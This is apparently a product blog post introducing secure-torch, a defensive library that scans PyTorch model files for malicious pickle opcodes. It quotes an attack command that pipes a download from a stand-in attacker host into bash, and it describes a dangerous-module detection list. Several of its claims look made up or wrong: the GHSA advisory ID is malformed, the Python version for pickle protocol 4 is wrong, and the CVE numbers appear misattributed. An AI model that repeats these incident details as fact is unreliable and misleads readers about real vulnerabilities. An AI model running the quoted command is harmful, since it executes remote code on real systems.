# The AI Model Supply Chain is Broken — Here's How to Fix It

*Posted 2026-02-18 | secure-torch v0.1.0*

---

## The problem nobody is talking about

Every week, thousands of AI models are downloaded from HuggingFace, GitHub, and S3 buckets and loaded directly into production inference pipelines. The default loading mechanism — `torch.load` — executes arbitrary Python code embedded in the model file.

This is not a theoretical risk. It has happened.

**CVE-2023-44271** — A malicious PyTorch model file circulated that, when loaded with `torch.load`, executed `os.system("curl attacker.com | bash")`. The attack was trivially simple: a pickle payload with a `STACK_GLOBAL` opcode referencing `nt.system` (the Windows alias for `os.system`).

**CVE-2023-32686** — Keras Lambda layers serialize arbitrary Python functions into pickle. A model shared on a public repository contained a Lambda layer that exfiltrated environment variables on load.

**GHSA-v9fq-2296** — HuggingFace's safetensors format was targeted via metadata injection. The `__metadata__` field contained a string that, when eval'd by a downstream pipeline, executed code.

The ML ecosystem has a supply chain problem. And unlike npm or PyPI, there is no standard mechanism for signing, verifying, or enforcing trust on model files.

---

## Why existing solutions are insufficient

**`weights_only=True`** (PyTorch 2.0+) restricts the pickle allowlist. It helps, but:
- It only covers PyTorch pickle format
- It does not verify *who* produced the model
- It does not provide an audit trail

**safetensors** eliminates unsafe deserialization. But:
- It only covers the safetensors format
- It does not verify provenance
- It does not enforce publisher trust

**Container signing** (cosign, Notary) signs the container, not the model. A signed container can still contain a malicious model.

---

## Introducing secure-torch: The Model Trust Gateway

secure-torch is a **Model Trust Enforcement Layer** — a new abstraction that sits between your model distribution layer and your inference code.

```
[HuggingFace / S3 / Registry]
         ↓
[secure-torch Trust Layer]
  ├─ signature verification
  ├─ publisher policy enforcement
  ├─ explainable threat scoring
  └─ sandbox isolation
         ↓
[Your inference code]
```

### Drop-in replacement

```python
# Before
import torch
model = torch.load("model.pt")

# After — zero config, immediate protection
import secure_torch as torch
model = torch.load("model.pt")
```

### Explainable threat scoring

Unlike a magic number, secure-torch gives you a named breakdown:

```python
model, report = torch.load("model.pt", audit_only=True)
print(report.score_breakdown)
# {'unsigned_model': 40, 'custom_ops_detected': 30}
```

### Fail-closed by design

```python
# Require a valid Sigstore signature
model = torch.load("model.pt", require_signature=True)

# Restrict to trusted publishers
model = torch.load(
    "model.pt",
    trusted_publishers=["huggingface.co/meta"],
)
```

---

## How we block CVE-2023-44271

The attack uses Python's `STACK_GLOBAL` opcode (protocol 4, Python 3.10+). The opcode pops two strings from the stack — the module name and the function name — and resolves them as a callable.

The tricky part: `arg=None` for `STACK_GLOBAL`. The module and name are pushed as separate `SHORT_BINUNICODE` strings *before* the opcode. A naive validator that only checks `arg` will miss this.

Our fix: track a string stack across opcodes. When `STACK_GLOBAL` is encountered, reconstruct the module reference from the last two string pushes.

```python
elif name == "STACK_GLOBAL":
    if len(string_stack) >= 2:
        module_name = string_stack[-2]   # second-to-last push
    ...
    _check_module_ref(module_name, pos, scorer)
```

We also added `nt` (Windows alias for `os`) and `posix` (Unix alias) to the dangerous modules list — the original CVE used `nt.system` specifically to evade validators that only checked `os`.

---

## Gradual adoption

You don't have to enforce on day one. Start with audit mode:

```python
model, report = torch.load("model.pt", audit_only=True)
print(report.threat_level)  # ThreatLevel.MEDIUM
```

Evaluate your model inventory. Then enable enforcement when you're ready.

---

## What's next

- **SBOM integration** — SPDX AI Profile support for training data provenance
- **OPA policy engine** — enforce custom policies (GPL datasets, PII models)
- **LangChain / LlamaIndex integration** — trust enforcement in agent pipelines

Install: `pip install secure-torch`

GitHub: [https://github.com/Avanishk05/secure-torch](https://github.com/Avanishk05/secure-torch)
